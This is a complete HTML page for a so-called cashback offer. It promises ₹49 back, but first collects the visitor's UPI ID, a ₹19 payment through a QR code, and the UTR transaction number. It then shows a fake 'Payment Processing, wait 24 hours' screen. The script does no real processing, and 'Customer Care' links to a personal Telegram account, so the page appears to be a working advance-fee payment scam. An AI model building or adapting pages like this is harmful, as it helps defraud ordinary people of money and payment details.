<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Cashback Offer</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">

<style>
*{box-sizing:border-box;font-family:Poppins}
body{
  margin:0;
  min-height:100vh;
  background:linear-gradient(135deg,#eef2ff,#ffffff);
  display:flex;
  justify-content:center;
  padding:20px;
}
.app{
  width:100%;
  max-width:420px;
  background:#fff;
  border-radius:22px;
  padding:22px;
  box-shadow:0 20px 40px rgba(0,0,0,.08);
}
.top{
  display:flex;
  justify-content:space-between;
  align-items:center;
  font-size:13px;
  color:#2563eb;
  font-weight:500;
}
.logo{
  text-align:center;
  margin-top:10px;
}
.logo img{
  width:90px;
  height:90px;
  border-radius:50%;
  box-shadow:0 8px 20px rgba(0,0,0,.15);
}
h1{
  font-size:20px;
  margin:14px 0 4px;
}
.sub{
  font-size:13px;
  color:#6b7280;
}
.card{
  margin:24px 0;
  background:linear-gradient(135deg,#f0f9ff,#ffffff);
  border-radius:18px;
  padding:18px;
  display:flex;
  align-items:center;
  gap:14px;
}
.card span{
  width:52px;
  height:52px;
  background:#e0f2fe;
  color:#0284c7;
  border-radius:14px;
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:24px;
  font-weight:600;
}
.card b{
  font-size:24px;
}
label{
  font-size:13px;
  color:#374151;
}
input{
  width:100%;
  margin-top:6px;
  padding:14px;
  border-radius:12px;
  border:1px solid #e5e7eb;
  font-size:14px;
}
input:focus{border-color:#2563eb;outline:none}
button{
  width:100%;
  margin-top:22px;
  padding:16px;
  border:none;
  border-radius:14px;
  background:linear-gradient(135deg,#2563eb,#3b82f6);
  color:#fff;
  font-size:17px;
  font-weight:600;
}
button:active{transform:scale(.97)}
#error{display:none;color:#ef4444;font-size:13px;margin-top:6px}

/* QR Sheet */
.sheet{
  position:fixed;
  inset:0;
  background:rgba(0,0,0,.35);
  display:none;
  justify-content:center;
  align-items:flex-end;
}
.sheet-box{
  width:100%;
  max-width:420px;
  background:#fff;
  border-radius:22px 22px 0 0;
  padding:20px;
  animation:up .3s ease;
}
@keyframes up{from{transform:translateY(100%)}}
.sheet img{
  width:100%;
  border-radius:16px;
}
.processing{
  position:fixed;
  inset:0;
  background:#fff;
  display:none;
  align-items:center;
  justify-content:center;
  flex-direction:column;
}
.processing img{
  width:110px;
  height:110px;
  border-radius:50%;
  animation:spin 1.4s linear infinite;
}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>

<body>

<div class="app">
  <div class="top" onclick="openSupport()">Customer Care</div>

  <div class="logo">
    <img src="https://i.ibb.co/7JxbMKGG/images-26.jpg">
    <h1>Cashback 21 Dec – 1 Jan</h1>
    <div class="sub">Fastest Cashback • Trusted Offer</div>
  </div>

  <div class="card">
    <span>₹</span>
    <div>
      <small>Cashback Amount</small>
      <b>₹49</b>
    </div>
  </div>

  <label>UPI ID</label>
  <input id="upi" placeholder="example@upi">
  <div id="error">UPI ID required</div>

  <button onclick="pay()">Pay ₹19</button>
</div>

<!-- QR Sheet -->
<div class="sheet" id="sheet">
  <div class="sheet-box">
    <img src="https://i.ibb.co/d0sX6zjV/IMG-20251224-214557.jpg">
    <h3 style="margin:14px 0 6px">Scan & Pay ₹19</h3>
    <p style="color:#6b7280;font-size:13px">Use any UPI app</p>
    <input id="utr" placeholder="Enter UTR Number">
    <button style="margin-top:12px;background:#16a34a" onclick="submitUTR()">Submit</button>
  </div>
</div>

<!-- Processing -->
<div class="processing" id="processing">
  <img src="https://i.ibb.co/hRxqY3gG/icono-ind-prestamos.png">
  <h3>Payment Processing</h3>
  <p style="color:#6b7280">wait  24 hours</p>
</div>

<script>
function pay(){
  if(!upi.value.trim()){
    error.style.display='block';
    return;
  }
  error.style.display='none';
  sheet.style.display='flex';
}
function submitUTR(){
  if(!utr.value.trim()) return alert("Enter UTR");
  sheet.style.display='none';
  processing.style.display='flex';
}
function openSupport(){
  window.open('https://t.me/nithunat','_blank');
}
</script>

</body>
</html>
